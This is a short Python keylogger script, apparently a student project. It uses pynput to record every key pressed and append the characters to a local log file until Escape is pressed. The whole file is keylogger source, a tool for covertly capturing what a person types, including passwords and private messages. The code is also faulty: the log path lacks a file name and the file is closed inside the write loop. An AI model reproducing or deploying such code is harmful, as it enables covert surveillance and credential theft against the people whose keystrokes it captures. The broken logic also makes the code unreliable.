


from pynput.keyboard import Key, Listener


key_strokes = "key_log.txt"
key_path = "C:\\Users\\shaha\\PycharmProjects\\S6keylogger"
extend = "\\"
file_merge = key_path + extend


#keystroke gathering!!!!

count = 0
keys =[]


#Logging the Keystrokes into the list Keys[]
def on_press(key):
    global keys, count

    print(key)
    keys.append(key)
    count += 1

    if count >= 1:       #checking if any key is pressed
        count = 0
        write_file(keys)  #calling the function write file to log the (key) into text file key_strokes.txt
        keys = []         #emptying the list 


#sorting the keystrokes

def write_file(keys):
    with open(file_merge, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()

      
    
# definging the function to exit from keylogger program(key= esc)
def on_release(key):
    if key == Key.esc:
        return False

#calling the funtions (on_press,on_release)
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


